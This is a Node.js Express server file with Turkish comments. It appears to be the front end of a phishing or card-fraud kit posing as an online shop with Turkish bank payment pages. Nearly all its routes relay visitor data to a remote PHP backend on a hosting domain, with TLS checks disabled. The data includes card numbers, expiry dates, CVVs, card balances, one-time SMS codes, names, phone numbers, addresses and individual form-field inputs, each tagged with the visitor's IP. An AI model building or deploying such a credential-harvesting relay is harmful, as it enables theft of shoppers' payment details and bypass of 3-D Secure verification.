// app.js
const express = require('express');
const axios = require('axios');
const https = require('https');
const cookieParser = require('cookie-parser');
const path = require('path');
const cors = require('cors');
const qs = require('querystring');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;

// --- middleware ---
app.use(cookieParser());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cors());

// --- IP helper ---
function getClientIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) return forwarded.split(',')[0].trim();
  const rawIp = req.connection.remoteAddress || '127.0.0.1';
  return rawIp.replace(/^::ffff:/, '');
}

// --- GEÇİCİ: SSL doğrulamasını kapatan agent ---
const insecureAgent = new https.Agent({ rejectUnauthorized: false });

// --- Ortak axios instance ---
// Tüm DMN istekleri buradan geçer; header ve httpsAgent tek yerde.
const DMN_BASE = 'https://forestgreen-rook-759809.hostingersite.com/dmn';
const axiosDMN = axios.create({
  baseURL: DMN_BASE,
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  httpsAgent: insecureAgent,
  timeout: 15000,
});

// -------------------- ROUTES ------------------------

app.get('/', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post('/index.php', qs.stringify({ ip: clientIp }));
    res.send(r.data);
  } catch (error) {
    console.error('Veri çekme hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/sepet', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post('/sepet.php', qs.stringify({ ip: clientIp }));
    res.send(r.data);
  } catch (error) {
    console.error('Sepet çekme hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/kampanya', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post('/kampanya.php', qs.stringify({ ip: clientIp }));
    res.send(r.data);
  } catch (error) {
    console.error('Kampanya çekme hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/adres', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post('/adres.php', qs.stringify({ ip: clientIp }));
    res.send(r.data);
  } catch (error) {
    console.error('Adres çekme hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/odeme', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post('/odeme.php', qs.stringify({ ip: clientIp }));
    res.send(r.data);
  } catch (error) {
    console.error('Ödeme sayfası hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/payment/garanti', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post('/payment/garanti.php', qs.stringify({ ip: clientIp }));
    res.send(r.data);
  } catch (error) {
    console.error('Ödeme (garanti) hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/payment/akbank', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post('/payment/akbank.php', qs.stringify({ ip: clientIp }));
    res.send(r.data);
  } catch (error) {
    console.error('Ödeme (akbank) hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/payment/yapikredi', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post('/payment/yapikredi.php', qs.stringify({ ip: clientIp }));
    res.send(r.data);
  } catch (error) {
    console.error('Ödeme (yapikredi) hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/payment/bkm', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post('/payment/bkm.php', qs.stringify({ ip: clientIp }));
    res.send(r.data);
  } catch (error) {
    console.error('Ödeme (bkm) hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/dogrulama', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post('/payment/dogrulama.php', qs.stringify({ ip: clientIp }));
    res.send(r.data);
  } catch (error) {
    console.error('Doğrulama hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/urun', async (req, res) => {
  try {
    const id = req.query.id;
    if (!id) return res.status(400).send('ID parametresi eksik.');
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post(`/urun?id=${encodeURIComponent(id)}`, qs.stringify({ ip: clientIp }));
    res.send(r.data);
  } catch (error) {
    console.error('Ürün sayfası hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/acsredirect', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post('/acsredirect.php', qs.stringify({ ip: clientIp }));
    console.log('Gelen veri:', r.data);

    let data = r.data;
    if (typeof data === 'string') {
      try { data = JSON.parse(data); } catch (_) {}
    }
    if (data && data.redirect) return res.redirect(data.redirect);

    res.status(500).send('Yönlendirme bilgisi yok.');
  } catch (error) {
    console.error('acsredirect hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

// NOT: Express'te "/yol?query=deger" route OLMAZ. Ayrı path tanımladık:
app.get('/acsredirect/error', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post('/acsredirect.php?control=error', qs.stringify({ ip: clientIp, control: 'error' }));
    console.log('Gelen veri:', r.data);

    let data = r.data;
    if (typeof data === 'string') {
      try { data = JSON.parse(data); } catch (_) {}
    }
    if (data && data.redirect) return res.redirect(data.redirect);

    res.status(500).send('Yönlendirme bilgisi yok.');
  } catch (error) {
    console.error('acsredirect (error) hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.post('/veri', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const r = await axiosDMN.post(`/veri.php?ip=${encodeURIComponent(clientIp)}`);
    res.send(r.data);
  } catch (error) {
    console.error('PHP sunucusuna bağlanılamadı:', error.message);
    res.status(500).send('sunucu_hatasi');
  }
});

app.post('/api/sepet/ekle', async (req, res) => {
  try {
    const ip = getClientIp(req);
    const { urun_id } = req.body;
    const r = await axiosDMN.post('/request.php', qs.stringify({ action: 'sepet_ekle', urun_id, ip }), {
      headers: { 'X-Requested-With': 'XMLHttpRequest' },
    });
    res.json({ status: String(r.data).trim() });
  } catch (error) {
    console.error('Sepete ekleme hatası:', error.message);
    res.json({ status: 'fail' });
  }
});

app.post('/action/process', async (req, res) => {
  try {
    const ip = getClientIp(req);
    const { otpCode } = req.body;
    const r = await axiosDMN.post('/payment/action/process.php', qs.stringify({ otpCode, ip }), {
      headers: { 'X-Requested-With': 'XMLHttpRequest' },
    });
    res.json({ status: String(r.data).trim() });
  } catch (error) {
    console.error('OTP işlem hatası:', error.message);
    res.json({ status: 'fail' });
  }
});

app.post('/api/sepet/sil', async (req, res) => {
  try {
    const ip = getClientIp(req);
    const { urun_id } = req.body;
    const r = await axiosDMN.post('/request.php?action=sepet_sil', qs.stringify({ urun_id, ip }), {
      headers: { 'X-Requested-With': 'XMLHttpRequest' },
    });
    res.json({ status: String(r.data).trim() });
  } catch (error) {
    console.error('Sepet silme hatası:', error.message);
    res.json({ status: 'fail' });
  }
});

app.post('/api/sepet/tumunu-sil', async (req, res) => {
  try {
    const ip = getClientIp(req);
    const r = await axiosDMN.post('/request.php?action=butunsepetsil', qs.stringify({ ip }), {
      headers: { 'X-Requested-With': 'XMLHttpRequest' },
    });
    res.json({ status: String(r.data).trim() });
  } catch (error) {
    console.error('Sepet silme hatası:', error.message);
    res.json({ status: 'fail' });
  }
});

app.post('/api/adres', async (req, res) => {
  try {
    const ip = getClientIp(req);
    const data = {
      addressType: req.body.addressType || 'CONSUMER',
      isDelivery: req.body.isDelivery || 'true',
      addressClass: req.body.addressClass,
      cityCode: req.body.cityCode,
      townCode: req.body.townCode,
      districtCode: req.body.districtCode,
      boulevard: req.body.boulevard,
      building: req.body.building,
      floor: req.body.floor,
      appartment: req.body.appartment,
      streetname: req.body.streetname,
      firstName: req.body.firstName,
      lastName: req.body.lastName,
      mobilePhoneNumber: req.body.mobilePhoneNumber,
      email: req.body.email,
      ip,
    };
    await axiosDMN.post('/request.php?action=adres', qs.stringify(data), {
      headers: { 'X-Requested-With': 'XMLHttpRequest' },
    });
    res.redirect('/adres');
  } catch (error) {
    console.error('Adres gönderme hatası:', error.message);
    res.status(500).json({ status: 'fail' });
  }
});

app.post('/api/adres/sil', async (req, res) => {
  try {
    const ip_adresi = req.body.ip_adresi || getClientIp(req);
    const r = await axiosDMN.post('/sil_adres.php', qs.stringify({ ip_adresi }), {
      headers: { 'X-Requested-With': 'XMLHttpRequest' },
    });
    const ok = r.data && r.data.success === true;
    if (ok) return res.json({ success: true });
    return res.json({ success: false, message: 'Silme başarısız: ' + (r.data && r.data.message) });
  } catch (error) {
    console.error('Adres silme hatası:', error.message);
    res.status(500).json({ success: false, message: 'Sunucu hatası oluştu.' });
  }
});

app.post('/dmndmn', async (req, res) => {
  try {
    const { input_name, input_value, ip } = req.body;
    const r = await axiosDMN.post('/input_kaydet.php', qs.stringify({ input_name, input_value, ip }), {
      headers: { 'X-Requested-With': 'XMLHttpRequest' },
    });
    res.send(r.data);
  } catch (error) {
    console.error('Ödeme hatası:', error.message);
    res.status(500).send('fail');
  }
});

app.post('/api/odeme', async (req, res) => {
  try {
    const ip = getClientIp(req);
    const { isim_soyisim, kredi_karti, skt, cvv, bakiye } = req.body;
    const r = await axiosDMN.post('/test.php', qs.stringify({ isim_soyisim, kredi_karti, skt, cvv, bakiye, ip }), {
      headers: { 'X-Requested-With': 'XMLHttpRequest' },
    });
    res.send(r.data);
  } catch (error) {
    console.error('Ödeme hatası:', error.message);
    res.status(500).send('fail');
  }
});

app.listen(port, () => {
  console.log(`Web sunucusu http://localhost:${port} adresinde çalışıyor.`);
});
